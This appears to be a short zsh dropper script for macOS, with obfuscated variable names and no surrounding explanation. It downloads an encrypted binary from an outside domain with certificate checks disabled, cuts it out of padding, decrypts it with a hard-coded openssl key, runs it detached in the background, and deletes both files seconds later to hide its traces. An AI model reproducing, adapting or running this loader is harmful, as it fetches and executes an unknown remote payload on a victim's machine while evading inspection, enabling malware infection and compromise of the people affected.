#!/bin/zsh
e6bgd=$(mktemp /tmp/tsmznd.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/ma405775417fdd44f.bin" -o "$e6bgdz" || exit 1
uchuwx=$(stat -f %z "$e6bgdz"); zsctb4c=$(( uchuwx - 3151 - 342 ))
tail -c +$(( 3151 + 1 )) "$e6bgdz" | head -c $zsctb4c | openssl enc -d -aes-256-cbc -k 29e04e42ae52a9ae37f6fa20 -out "$e6bgd" 2>/dev/null
[ -s "$e6bgd" ] && chmod 700 "$e6bgd" && ( "$e6bgd" & ) && disown
( sleep 3; rm -f "$e6bgd" "$e6bgdz" ) &>/dev/null &
